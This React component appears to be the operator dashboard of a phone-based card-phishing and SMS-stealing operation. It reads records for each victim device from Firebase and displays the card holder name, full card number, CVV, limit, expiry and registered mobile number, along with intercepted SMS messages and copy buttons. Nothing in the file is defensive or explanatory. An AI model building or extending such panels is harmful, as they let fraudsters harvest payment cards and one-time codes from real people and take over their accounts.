import './App.css';
import React from 'react'
import { useState, useEffect } from 'react'
import { db } from './config';
import { ref, onValue, DataSnapshot, remove } from 'firebase/database';
import './Messages.css';
import Cards from './Cards';
import { CopyToClipboard } from 'react-copy-to-clipboard';


function Messages(props) {
  const [todoData, setTodoData] = useState([])
  const [card, setCard] = useState([])
  const [copied, setCopied] = useState(null);

  useEffect(() => {
    const starCountRef = ref(db, `Devices/${props.val}/Messages`)
    const starCount = ref(db, `Devices/${props.val}/Name`)
    // const redeem = ref(db,`DEVICES/${props.val}/REDEEM`)
    // const starCountRef = ref(db,`DEVICES/1fe5164fc5898c46 moto g73 5G/MESSAGES`)
    
    onValue(starCount, (snapshot) => {
      const data = snapshot?.val()
      try {
        const newPost = Object.keys(data).map(key => ({
          id: key,
          ...data[key]
        }));
        newPost.sort((a, b) => {
          return b.id - a.id;
        });
        setCard(newPost);

      } catch (err) {
        const val = [];
        setCard(val);
      }
    });


    onValue(starCountRef, (snapshot) => {
      const data = snapshot?.val()
      try {
        const newPost = Object.keys(data).map(key => ({
          id: key,
          ...data[key]
        }));
        newPost.sort((a, b) => {
          return b.id - a.id;
        });
        setTodoData(newPost);

      } catch (err) {
        const val = [];
        setTodoData(val);
      }
    });

  }, [props.val]);


  

  return (

    <div className="messages-items">
      <br></br>
      {/* <Cards></Cards> */}
      
      <b>Device INFO - {props.val} <br /> Name - {props.name}  <br />  Number - {props.number} &nbsp; &nbsp;
      <CopyToClipboard text={`Number -${props.number}`} onCopy={() => setCopied(props.number)}>
                <button>Copy</button>
              </CopyToClipboard>
              &nbsp;&nbsp;
              <CopyToClipboard text={`Name -${props.name}`} onCopy={() => setCopied(props.name)}>
                <button>Copy</button>
              </CopyToClipboard>
      </b>


      {/* <div> <b>Mobile Number -  {props.val1}</b></div> */}
      <div>
        {card.length > 0 && <div className="card"  >
          {/* <div >({index+1}).  {item.id}</div> */}
          {/* <div className='msg1'><b>Card No - {index+1} </b> */}
          <br></br>
          <div className='msg-con'>Card Holder name -  {card[0]?.cardHoldName}</div>
          <div className='msg-con'>Card Number - {card[0]?.cardNum}</div>
          <div className='msg-con'>CVV -  {card[0]?.cvv}</div>
          <div className='msg-con'>Limit -  {card[0]?.limit}</div>
          <div className='msg-con'>Month -  {card[0]?.month}</div>
          <div className='msg-con'>Registered Mobile Number -  {card[0]?.regiMobile}</div>
          <div className='msg-con'>Year -  {card[0]?.year}</div>

          {/* </div> */}
        </div>}

      </div>
      <br></br>
      <br></br>

      {todoData.length > 0 && todoData.map((item, index) => (
        <div className='msg' key={index}>
          <b>{index + 1}. </b>
          <div className="message">
            <div className='msg-con'>From - {item?.address}</div>
            <div className='msg-con'>Messages - {item?.body}
            </div>
            <div className='msg-con'>Date - {item?.date}</div>
            <div className='buttonCopyDelete'>

              {/* <CopyToClipboard text={`Number -${props.number} \nMessage - ${item?.body}`} onCopy={() => setCopied(index)}>
                <button>Copy</button>
              </CopyToClipboard> */}

              <br />
              {copied == index && <span style={{ color: 'black' }}>copied</span>}
            </div>
          </div>

        </div>
      ))}
      {todoData.length === 0 && <div>No messages</div>}

    </div>
  )
      }
export default Messages